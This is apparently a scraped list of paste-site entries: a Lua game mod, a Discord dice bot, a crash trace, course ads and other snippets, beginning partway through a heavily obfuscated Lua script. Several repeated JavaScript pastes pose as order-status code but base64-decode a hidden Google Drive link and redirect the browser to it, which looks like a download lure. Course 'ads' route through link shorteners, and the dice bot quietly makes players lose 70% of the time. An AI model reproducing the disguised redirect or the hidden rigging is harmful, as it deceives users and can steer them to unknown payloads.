V=p(-657339+598500)C=g[V]V=p(219466-278292)B=C[V]C=B(u,Z)B=G[s[-403208+403214]]Z=nil V=B()E=C+V a=E+t V=-92970-(-92971)E=-388537+388793 L=a%E t=L E=k[N]C=t+V i=-457709+7791160 B=Q[C]a=E..B k[N]=a end else if i<13913623-(-59732)then z=p(284172-343018)q=D()E=D()Z=nil Q=nil U={}L=nil W=nil v=p(794316+-853172)j=r(-478578+16520975,{E;J,H;w})a={}G[E]=a a=D()c=p(191368+-250233)G[a]=j t=nil j={}x=nil w=M(w)G[q]=j j=g[z]m=G[q]o={}A={[c]=m,[v]=W}z=j(U,A)j=e(13639606-279750,{q;E;d;J,H,a})d=M(d)k=z x=p(53934+-112764)a=M(a)E=M(E)q=M(q)R=nil R=21904532043426-(-520502)J=M(J)N=j w=p(-63073-(-4220))H=M(H)Q=g[w]i=g[p(-630391-(-571534))]H=p(167131+-225958)t=g[x]J=N(H,R)Z=k[J]k=nil J=p(-109809+50965)J=t[J]x={J(t,Z)}w=Q(T(x))Q=w()N=nil else Q=nil i=-120146+14718890 t=nil x=nil end end end end else if i<1022675+14440622 then if i<14763153-(-266754)then if i<14002852-(-744173)then if i<-723602+15223604 then if i<-451350+14632382 then i={}w=35184372852643-763811 G[s[-219150+219152]]=i i=-817033+8150484 x=-811619+811874 o=G[s[-223864+223867]]Q=o o=N%w Z=p(-433750+374911)G[s[1046611+-1046607]]=o t=N%x H=-592951+592952 x=-660219+660221 w=t+x G[s[-737541+737546]]=w x=g[Z]Z=p(945232+-1004064)t=x[Z]x=t(u)R=H t=p(712326+-771168)Z=671562+-671561 k[N]=t t=-609926+610093 J=x H=-50236-(-50236)d=R<H H=Z-R else i=14257581-(-341163)end else o={N}i=g[p(989494+-1048319)]end else if i<576985+14388519 then i=9054957-(-649734)else k=G[s[400922+-400916]]N=k==u o=N i=5731571-(-599042)end end else if i<15603745-335357 then if i<14136469-(-963769)then N=G[s[-557297-(-557299)]]k=-702536-(-702541)u=N*k N=14234403393924-(-84063)o=u+N u=35184371498792-(-590040)i=o%u G[s[-264441-(-264443)]]=i N=-286380-(-286381)u=G[s[67729+-67726]]i=496017+253535 o=u~=N else t=G[w]i=15587759-(-314851)o=t end else if i<14729944-(-610940)then o=10028599-(-590810)N=p(687000-745840)k=364171+3861347 u=N^k i=o-u u=i o=p(-58927-(-75))i=o/u o={i}i=g[p(-391893-(-333032))]else o={}i=g[p(723583-782416)]end end end else if i<16065659-58128 then if i<15676090-(-204602)then if i<16199486-487426 then if i<15113808-(-404585)then Z=-474983+474983 N=k J=-648558+648813 i=G[s[68206-68205]]x=i(Z,J)u[N]=x N=nil i=7694658-(-906689)else o=p(-940929-(-882106))i=g[o]u=p(335616-394459)o=g[u]u=p(-168247+109404)g[u]=i u=p(-1023540+964717)g[u]=o u=G[s[284007-284006]]N=u()i=8581010-360691 end else z=p(417609-476438)U=776119+-776019 q=D()G[q]=B o=g[z]v=564730+-564728 z=p(979463-1038329)i=o[z]z=-752218-(-752219)o=i(z,U)A=766752-766497 W=p(784258+-843112)U=-145835-(-145835)z=D()m=374117+-374116 G[z]=o i=G[x]o=i(U,A)A=363035-363034 U=D()h=94904-94904 G[U]=o i=G[x]c=G[z]o=i(A,c)A=D()G[A]=o o=G[x]c=o(m,v)o=-945053-(-945054)S=209811-199811 i=c==o c=D()o=p(-666281+607450)v=p(-542115-(-483280))G[c]=i P=g[W]y=G[x]K={y(h,S)}W=P(T(K))i=p(853832-912677)P=p(-161669+102834)f=W..P m=v..f i=a[i]i=i(a,o,m)m=D()G[m]=i v=p(774655+-833519)f=r(-227800+5213411,{x;q;H,k,N;E,c,m;z,A,U;J})o=g[v]v={o(f)}i={T(v)}v=i i=G[c]i=i and 7510397-570354 or-408626+4440583 end else if i<16885880-982127 then t=o x=p(310315-369144)Z=p(-604254-(-545399))o=g[x]x=p(-215296+156430)i=o[x]x=D()G[x]=i o=g[Z]Z=p(-942382-(-883514))d=p(621538+-680393)i=o[Z]R=g[d]Z=i H=i J=R i=R and 12023485-(-996749)or-435377+7676979 else j=p(-235048+176225)i=g[j]j=p(-159947+101104)g[j]=i i=-679201+15608171 end end else if i<15468169-(-829370)then if i<-813037+16948350 then u=G[s[1037419+-1037418]]o=#u u=523266+-523266 i=o==u i=i and 292462+14779299 or 5813540-618531 else a=E U=a i=403007+9108916 L[a]=U a=nil end else if i<-670312+17201287 then i=-808996+3814257 j=-501277+501277 E=#L a=E==j else i=true i=i and 9609413-(-749246)or 2925414-158834 end end end end end end end i=#I return T(o)end,function(g,p)local T=k(p)local O=function(O)return i(g,{O},p,T)end return O end,function(g,p)local T=k(p)local O=function(O,s,I,Y)return i(g,{O;s;I;Y},p,T)end return O end,function(g,p)local T=k(p)local O=function()return i(g,{},p,T)end return O end,function(g)for p=44475+-44474,#g,859010-859009 do u[g[p]]=(69937+-69936)+u[g[p]]end if O then local i=O(true)local T=I(i)T[p(669761+-728626)],T[p(-843560+784712)],T[p(-153361+94533)]=g,Q,function()return-3474730-(-462036)end return i else return s({},{[p(508440+-567288)]=Q;[p(845308+-904173)]=g,[p(-950231-(-891403))]=function()return-2060626-952068 end})end end return(w(11047853-(-815989),{}))(T(o))end)(getfenv and getfenv()or _ENV,unpack or table[p(44336+-103174)],newproxy,setmetatable,getmetatable,select,{...})end)(...)"
u5YEhNmM,Untitled,zebmekey,JavaScript,Monday 21st of April 2025 05:42:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15131/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9qskJA1A,Django Python: Build a Full Stack Website with Features,f0f077,Python,Monday 21st of April 2025 05:41:26 PM CDT,"Django Python: Build a Full Stack Website with Features
Master Django: Full Stack Website with Email Functionality, Messaging, Commenting, API Development and More!
What you will learn
How to Build a Django website from start to finish
User Registration and Authentication
Hosting a website on a live server
Building out a REST API
for more:https://cuty.io/iEs3IKA"
CtecJj5w,omtest,KiRE750,Lua,Monday 21st of April 2025 05:23:32 PM CDT,"local component = require(""component"")
local colors = require(""colors"")
local os = require(""os"")
local math = require(""math"")
local term = require(""term"")
local event = require(""event"")
local unicode = require(""unicode"")
local comp = require(""computer"")
local io = require(""io"")

local thread = require(""thread"")

local modem = component.modem
local gpu = component.gpu
local computer = computer.computer

local user = ""OFFLINE""

--system functions--
--function error(message, optionA, optionB)
	function getConfig()
    	if filesystem.exists() then 					os.execute(""Omnia/mainConfig.cfg"")
    end

	function setConfig(variable, value) 
    	
    end
    	
    "
KCAeeib9,Products.js,WantingTrae,JavaScript,Monday 21st of April 2025 04:26:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77045/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iA40U8ap,Order.js,WantingTrae,JavaScript,Monday 21st of April 2025 04:11:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21491/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N4cNs7U6,Market.js,WantingTrae,JavaScript,Monday 21st of April 2025 03:56:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81062/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fdxV2Wns,Advanced Python course free,f0f077,Python,Monday 21st of April 2025 03:44:02 PM CDT,"
Advanced Python course free
Advanced Python is like leveling up in a video game. After you learn the basics, like how to write simple code, you can learn more cool stuff. It's like going from knowing how to walk to learning how to run and jump!
What you will learn
Students will learn about some of the advanced topics in Python.
It covers a lot of very interesting topics related to machine learning
It covers the intuition part of different Python Concepts
It covers some Advance Level Applications made in Python
for more:https://linkrex.net/D9NwXA9Rw"
styj1uxU,Scroll casting,Lynsis,Lua,Monday 21st of April 2025 03:42:08 PM CDT,"local DEBUG_ENABLED = true  -- Toggle this to false to disable debug messages

local matchingScrollFound = false
local scrollTemplate = ""nil""

Ext.Osiris.RegisterListener(""CastSpellFailed"", 5, ""after"", function(caster, spell, spellType, spellElement, storyActionID)
    if DEBUG_ENABLED then print(""[DEBUG] Spell cast failed for: "" .. spell) end
    matchingScrollFound = false
    scrollTemplate = ""nil""
end)

Ext.Osiris.RegisterListener(""StartedPreviewingSpell"", 4, ""after"", function(caster, spell, isMostPowerful, hasMultipleLevels)
    local spellStats = Ext.Stats.Get(spell)
    local spellName = (spellStats.SpellContainerID ~= """" and spellStats.SpellContainerID) or (spellStats.RootSpellID ~= """" and spellStats.RootSpellID) or spellStats.Name
    local spellContainerID = spellStats.SpellContainerID
    local spellPowerLevel = (spellStats.PowerLevel ~= 0 and spellStats.PowerLevel) or spellStats.Level
    local spellLevel = spellStats.Level
    local tooltipUpcastDescriptionParams = spellStats.TooltipUpcastDescriptionParams or """"

    if DEBUG_ENABLED then 
        print(""[DEBUG] StartedPreviewingSpell: "" .. spellName) 
        print(""[DEBUG] spellContainerID: "" .. spellContainerID)
        print(""[DEBUG] Spell PowerLevel: "" .. tostring(spellStats.PowerLevel)) 
        print(""[DEBUG] Spell Level: "" .. tostring(spellStats.Level)) 
        print(""[DEBUG] TooltipUpcastDescriptionParams: "" .. tooltipUpcastDescriptionParams)
        print(""[DEBUG] Used Spell PowerLevel: "" .. tostring(spellPowerLevel)) 
    end

    if spellLevel <= 0 then
        if DEBUG_ENABLED then print(""[DEBUG] Spell is invalid, skipping scroll check."") end
        return
    end

    local entity = Ext.Entity.Get(caster)
    if not entity or not entity.InventoryOwner then
        if DEBUG_ENABLED then print(""[DEBUG] Invalid caster entity or missing inventory."") end
        return
    end

    local function isMatchingScroll(item)
        local serverItem = item.ServerItem
        if not serverItem or not serverItem.Template or not serverItem.Template.OnUsePeaceActions then
            return false
        end

        for _, action in pairs(serverItem.Template.OnUsePeaceActions) do
            if action.Type == ""UseSpell"" and action.Spell then
                local scrollSpellName = action.Spell
                local scrollStats = Ext.Stats.Get(scrollSpellName)
                local scrollLevel = scrollStats.Level
                local scrollPowerLevel = (scrollStats.PowerLevel ~= 0 and scrollStats.PowerLevel) or scrollStats.Level
                local scrollTooltipUpcastDescriptionParams = scrollStats.TooltipUpcastDescriptionParams or """"

                if DEBUG_ENABLED then
                    print(""[DEBUG] Checking scroll: "" .. scrollSpellName)
                    print(""[DEBUG] Scroll PowerLevel: "" .. tostring(scrollStats.PowerLevel))
                    print(""[DEBUG] Scroll Level: "" .. tostring(scrollStats.Level))
                    print(""[DEBUG] Scroll TooltipUpcastDescriptionParams: "" .. scrollTooltipUpcastDescriptionParams)
                    print(""[DEBUG] Used Scroll PowerLevel: "" .. tostring(scrollPowerLevel))
                end

                -- Match by name only if TooltipUpcastDescriptionParams is empty
                if tooltipUpcastDescriptionParams == """" then
                    if string.lower(scrollSpellName) == string.lower(spellName) and scrollLevel == spellLevel then
                        if DEBUG_ENABLED then print(""[DEBUG] Matching scroll found by name and level: "" .. scrollSpellName) end
                        return true
                    end
                else
                    -- Match by PowerLevel if TooltipUpcastDescriptionParams is not empty
                    if string.lower(scrollSpellName) == string.lower(spellName) and scrollPowerLevel == spellPowerLevel then
                        if DEBUG_ENABLED then print(""[DEBUG] Matching scroll found by power level: "" .. scrollSpellName) end
                        return true
                    end
                end
            end
        end

        return false
    end

    for _, casterInv in pairs(entity.InventoryOwner.PrimaryInventory.InventoryContainer.Items) do
        local item = casterInv.Item

        if isMatchingScroll(item) then
            matchingScrollFound = true
            scrollTemplate = item.GameObjectVisual.RootTemplateId
            Osi.ShowNotification(caster, ""This cast will consume a scroll"")
            Osi.PlayHUDSound(caster, ""UI_HUD_Book_PageChanged"")
            if DEBUG_ENABLED then print(""[DEBUG] Scroll matched and flagged for removal."") end
            break
        end

        if item.InventoryOwner then
            for _, containerItemWrapper in pairs(item.InventoryOwner.PrimaryInventory.InventoryContainer.Items) do
                local nestedItem = containerItemWrapper.Item

                if isMatchingScroll(nestedItem) then
                    matchingScrollFound = true
                    scrollTemplate = nestedItem.GameObjectVisual.RootTemplateId
                    Osi.ShowNotification(caster, ""This cast will consume a scroll"")
                    Osi.PlayHUDSound(caster, ""UI_HUD_Book_PageChanged"")
                    if DEBUG_ENABLED then print(""[DEBUG] Nested scroll matched and flagged for removal."") end
                    break
                end
            end
        end

        if matchingScrollFound then break end
    end
end)

Ext.Osiris.RegisterListener(""CastedSpell"", 5, ""after"", function(caster, spell, spellType, spellElement, storyActionID)
    local spellStats = Ext.Stats.Get(spell)
    local spellPowerLevel = (spellStats.PowerLevel ~= 0 and spellStats.PowerLevel) or spellStats.Level
    local spellLevel = spellStats.Level

    -- If PowerLevel is 0, fall back to Level for restoring resources
    if spellStats.PowerLevel == 0 then
        spellPowerLevel = spellLevel
    end

    if DEBUG_ENABLED then
        print(""[DEBUG] CastedSpell event for: "" .. spell)
        print(""[DEBUG] PowerLevel: "" .. tostring(spellStats.PowerLevel))
        print(""[DEBUG] Level: "" .. tostring(spellStats.Level))
        print(""[DEBUG] Used Spell PowerLevel: "" .. tostring(spellPowerLevel))
    end

    if matchingScrollFound then
        if DEBUG_ENABLED then print(""[DEBUG] Consuming scroll with template: "" .. scrollTemplate) end
        Osi.TemplateRemoveFrom(scrollTemplate, caster, 1)

        -- Restore resources based on PowerLevel (or Level if PowerLevel was 0)
        if DEBUG_ENABLED then print(""[DEBUG] Restoring spell slot of PowerLevel "" .. spellPowerLevel) end
        restoreResource(caster, 1, ""SpellSlot"", spellPowerLevel)
    else
        if DEBUG_ENABLED then print(""[DEBUG] No scroll flagged; nothing to consume."") end
    end

    matchingScrollFound = false
    scrollTemplate = ""nil""
end)
"
vt6hTAkj,Untitled,WantingTrae,JavaScript,Monday 21st of April 2025 03:40:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92206/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8vU9T5Kq,Products.js,WantingTrae,JavaScript,Monday 21st of April 2025 03:25:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53626/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vsWzWLT9,"Learn PHP, HTML and CSS: the most comprehensive training",f0f077,PHP,Monday 21st of April 2025 03:24:36 PM CDT,"Learn PHP, HTML and CSS: the most comprehensive training
Learn how to create attractive websites | create a CMS project
What you will learn
You will learn everything you need in HTML
You will learn how to style your web pages in CSS
You will learn how to create a content management system (CMS) such as WordPress, Drupal or Joomla.
You will learn how to use databases
for more:https://short-jambo.ink/fIBKm"
ykafSeCs,host count by country,rgruber,JavaScript,Monday 21st of April 2025 03:24:09 PM CDT,"var a=""ADAEAFAGAIALAMAOARASATAUAWAXAZBABBBDBEBFBGBHBIBJBLBMBNBOBQBRBSBTBVBWBYBZCACCCDCFCGCHCICKCLCMCNCOCRCUCVCWCXCYCZDEDJDKDMDODZECEEEGEHERESETFIFJFKFMFOFRGAGBGDGEGFGGGHGIGLGMGNGPGQGRGSGTGUGWGYHKHMHNHRHTHUIDIEILIMINIOIQIRISITJEJMJOJPKEKGKHKIKMKNKPKRKWKYKZLALBLCLILKLRLSLTLULVLYMAMCMDMEMFMGMHMKMLMMMNMOMPMQMRMSMTMUMVMWMXMYMZNANCNENFNGNINLNONPNRNUNZOMPAPEPFPGPHPKPLPMPNPRPSPTPWPYQARERORSRURWSASBSCSDSESGSHSISJSKSLSMSNSOSRSSSTSVSXSYSZTCTDTFTGTHTJTKTLTMTNTOTRTTTVTWTZUAUGUMUSUYUZVAVCVEVGVIVNVUWFWSXKYEYTZAZMZW"";
for (var i=0;i<a.length;i+=2){
    let d=await fetch(""/p/hostcount.php?query=country:""+a.slice(i,i+2)).then(r=>r.json());
    console.log(d,a.slice(i,i+2));
}"
7j3wsMWa,Advanced Highlow Command (WITH BUTTONS + BET),IamnotJamesBG,Go,Monday 21st of April 2025 03:13:14 PM CDT,"$c[MADE BY iamnotjamesbg]
$c[Advanced Highlow command with buttons ORIGINAL IDEA]
$c[Used $try blocks to delete cooldowns, cool right?]
$c[Took me hours to make this]
$c[VARS NEEDED
money=0
betAmount=0
playerRoll=empty]
$c[OR replace all the vars with your money var!]

$c[======CODE 1======]
BDScript 2
Trigger: <prefix>highlow <bet>
Code:
$nomention
$suppressErrors
$try
$cooldown[15s;]
$catch
$var[cooldown;$sendMessage[$randomText[
⏳ Hold on! Wait **<t:$sum[$getTimestamp;$getCooldown[normal]]:R>** before playing again!; 
⏳ Chill out! You can play again in **<t:$sum[$getTimestamp;$getCooldown[normal]]:R>**.; 
⏳ Take it easy! You’ll be able to play again in **<t:$sum[$getTimestamp;$getCooldown[normal]]:R>**.; 
⏳ Patience, my friend! **<t:$sum[$getTimestamp;$getCooldown[normal]]:R>** until you can play again!; 
⏳ Hold up! Wait for **<t:$sum[$getTimestamp;$getCooldown[normal]]:R>** before trying again.; 
⏳ Don’t rush! You have to wait **<t:$sum[$getTimestamp;$getCooldown[normal]]:R>** to play again!
];yes]]
$replyIn[$getCooldown[normal]]
$deleteMessage[$channelID;$var[cooldown]]
$stop
$endtry
$argsCheck[>1;🚫 Please bet **atleast** something!]
$onlyIf[$isNumber[$replaceText[$message;all;$getUserVar[money;$authorID];1]]==true;🚫 **$message** is not a valid number!]
$onlyIf[$replaceText[$message;all;$getUserVar[money;$authorID];1]>=1;🚫 The minimum bet amount is 1!]
$onlyIf[$replaceText[$message;all;$getUserVar[money;$authorID];1]<=$getUserVar[money;$authorID];🚫 You don’t have enough coins!]

$if[$message==all]
  $var[betAmount;$min[$getUserVar[money;$authorID];200000]]
$else
  $var[betAmount;$min[$message;200000]]
$endif

$setUserVar[money;$sub[$getUserVar[money;$authorID];$var[betAmount]];$authorID]
$var[playerRoll;$random[26;86]]

$setVar[playerRoll;$var[playerRoll];$authorID]
$setVar[betAmount;$var[betAmount];$authorID]
$var[diceRoll;$random[2;101]]

$title[🎲 $username's High/Low Game]
$addField[Your Guess;$var[playerRoll];yes]
$addField[Dice Roll;?;yes]
$addButton[yes;high;⏫;secondary;no;]
$addButton[no;low;⏬;secondary;no;]
$color[00ff00]
$footer[Requested by $username | Your Bet: $numberSeparator[$var[betAmount]] Coins]

$c[======CODE 2======]
BDScript 2
Trigger: $onInteraction[high]
Code:
$c[I added a lostChance cuz BDFD's random is so easy to predict LOL]
$c[You can change the lostChance percentage inside if conditions, if you want!]
$nomention
$suppressErrors
$var[betAmount;$getVar[betAmount;$authorID]]  
$var[playerRoll;$getVar[playerRoll;$authorID]]  
$var[lostChance;$random[1;101]]  

$if[$var[lostChance]<=70]
    $var[diceRoll;$random[2;$sub[$var[playerRoll];1]]]
$else
    $var[diceRoll;$random[$sum[$var[playerRoll];1];101]]
$endif

$if[$var[diceRoll]>$var[playerRoll]]  
    $setUserVar[money;$sum[$getUserVar[money;$authorID];$multi[$var[betAmount];2]];$authorID]  
    $title[🎲 $username's High/Low Game]  
    $addField[Your Guess;$var[playerRoll];yes]  
    $addField[Dice Roll;$var[diceRoll];yes]  
    $addField[You win!;The dice roll was higher;no]  
    $footer[Requested by $username | You won: $numberSeparator[$var[betAmount]] Coins!]  
    $color[00ff00]  
    $editButton[high;⏫;success;yes;]
    $editButton[low;⏬;secondary;yes;]
$elseif[$var[diceRoll]==$var[playerRoll]]  
    $setUserVar[money;$sum[$getUserVar[money;$authorID];$var[betAmount]];$authorID]  
    $title[🎲 $username's High/Low Game]  
    $addField[Your Guess;$var[playerRoll];yes]  
    $addField[Dice Roll;$var[diceRoll];yes]  
    $addField[It's a tie!;The dice roll matched your guess;no]  
    $footer[Requested by $username | You get your bet back: $numberSeparator[$var[betAmount]] Coins!]  
    $color[FFFF00]  
    $editButton[high;⏫;secondary;yes;]
    $editButton[low;⏬;secondary;yes;]
$else  
    $title[🎲 $username's High/Low Game]  
    $addField[Your Guess;$var[playerRoll];yes]  
    $addField[Dice Roll;$var[diceRoll];yes]  
    $addField[You lose!;The dice roll was lower;no]  
    $footer[Requested by $username | You lost: $numberSeparator[$var[betAmount]] Coins!]  
    $color[FF0000]  
    $editButton[high;⏫;danger;yes;]
    $editButton[low;⏬;secondary;yes;]
$endif
$c[======CODE 3======]
Trigger: $onInteraction[low]
BDScript 2
Code:
$c[I also added a lostChance in here cuz BDFD's random is so easy to predict LOL]
$c[You can change the lostChance percentage inside if conditions, if you want!]
$nomention
$suppressErrors
$var[betAmount;$getVar[betAmount;$authorID]]
$var[playerRoll;$getVar[playerRoll;$authorID]]
$var[lostChance;$random[1;101]]
$if[$var[lostChance]<=70]
    $var[diceRoll;$random[$sum[$var[playerRoll];1];101]]
$else
    $var[diceRoll;$random[2;$sub[$var[playerRoll];1]]]
$endif
$if[$var[diceRoll]<$var[playerRoll]]
    $setUserVar[money;$sum[$getUserVar[money;$authorID];$multi[$var[betAmount];2]];$authorID]
    $title[🎲 $username's High/Low Game]
    $addField[Your Guess;$var[playerRoll];yes]
    $addField[Dice Roll;$var[diceRoll];yes]
    $addField[You win!;The dice roll was lower;no]
    $footer[Requested by $username | You won: $numberSeparator[$var[betAmount]] Coins!]
    $color[00ff00]
    $editButton[high;⏫;secondary;yes;]
    $editButton[low;⏬;success;yes;]
$elseif[$var[diceRoll]==$var[playerRoll]]
    $setUserVar[money;$sum[$getUserVar[money;$authorID];$var[betAmount]];$authorID]
    $title[🎲 $username's High/Low Game]
    $addField[Your Guess;$var[playerRoll];yes]
    $addField[Dice Roll;$var[diceRoll];yes]
    $addField[It's a tie!;The dice roll matched your guess;no]
    $footer[Requested by $username | You get your bet back: $numberSeparator[$var[betAmount]] Coins!]
    $color[FFFF00]
    $editButton[high;⏫;secondary;yes;]
    $editButton[low;⏬;secondary;yes;]
$else
    $title[🎲 $username's High/Low Game]
    $addField[Your Guess;$var[playerRoll];yes]
    $addField[Dice Roll;$var[diceRoll];yes]
    $addField[You lose!;The dice roll was higher;no]
    $footer[Requested by $username | You lost: $numberSeparator[$var[betAmount]] Coins!]
    $color[FF0000]
    $editButton[high;⏫;secondary;yes;]
    $editButton[low;⏬;danger;yes;]
$endif
$c[======END OF CODE======]"
rgfVrmWw,2025-04-21T21:10:49.414,powerampache,PHP,Monday 21st of April 2025 03:11:58 PM CDT,"1.01-79-free (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.UserNotEnabledException: User disabled
	at luci.sixsixsix.powerampache2.player.SimpleMediaServiceHandler$onPlayerError$1.invokeSuspend(SimpleMediaServiceHandler.kt:288)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)
Caused by: androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:268)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 403
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
